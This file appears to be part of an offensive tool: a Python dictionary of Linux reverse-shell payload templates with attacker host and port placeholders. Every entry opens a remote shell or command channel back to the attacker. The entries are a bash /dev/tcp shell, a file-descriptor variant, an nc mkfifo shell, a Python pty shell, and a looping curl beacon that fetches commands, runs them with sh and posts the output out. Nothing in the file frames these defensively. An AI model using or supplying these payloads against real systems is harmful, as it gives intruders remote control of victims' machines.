# Linux payload templates with {LHOST} and {LPORT}

payloads = {
	"bash_tcp": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
	"bash_sh": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
	"nc_mkfifo": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f",
	"python3_pty": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
	"curl_http_beacon": "while true; do curl -s -H 'Authorization: beacon-command' http://{LHOST}:{LPORT}/cmd | sh 2>&1 | curl -s -X POST -H 'Authorization: beacon-command' --data-binary @- http://{LHOST}:{LPORT}/out; sleep 5; done",
}